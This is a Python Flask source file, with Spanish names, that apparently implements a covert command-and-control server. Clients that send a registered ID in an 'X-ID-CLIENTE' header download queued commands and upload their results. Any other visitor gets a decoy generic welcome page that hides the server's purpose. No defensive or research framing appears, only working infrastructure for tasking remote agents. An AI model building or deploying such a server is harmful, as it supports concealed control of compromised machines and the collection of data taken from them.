from flask import Flask, request, Response
import os

app = Flask(__name__)

VALID_IDS_FILE = "/data/valid_ids/valid_ids.txt"
COMANDOS_DIR   = "/data/comandos"
RESULTADOS_DIR = "/data/resultados"

def load_valid_ids():
    if not os.path.exists(VALID_IDS_FILE):
        return set()
    with open(VALID_IDS_FILE) as f:
        return set(line.strip() for line in f if line.strip())

def unauthorized():
    return "<html><body><h1>Bienvenido</h1><p>Pagina generica.</p></body></html>", 200

@app.route("/", methods=["GET", "POST", "PUT", "DELETE"])
def handler():
    client_id = request.headers.get("X-ID-CLIENTE", "").strip()

    if not client_id or client_id not in load_valid_ids():
        return unauthorized()

    if request.method == "GET":
        filepath = os.path.join(COMANDOS_DIR, client_id, "comandos.txt")
        if not os.path.exists(filepath):
            return "Sin comandos.", 200
        with open(filepath) as f:
            return Response(f.read(), mimetype="text/plain")

    elif request.method == "POST":
        result_dir = os.path.join(RESULTADOS_DIR, client_id)
        os.makedirs(result_dir, exist_ok=True)
        filepath = os.path.join(result_dir, "resultados.txt")
        with open(filepath, "w") as f:
            f.write(request.get_data(as_text=True))
        return "OK", 200

    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)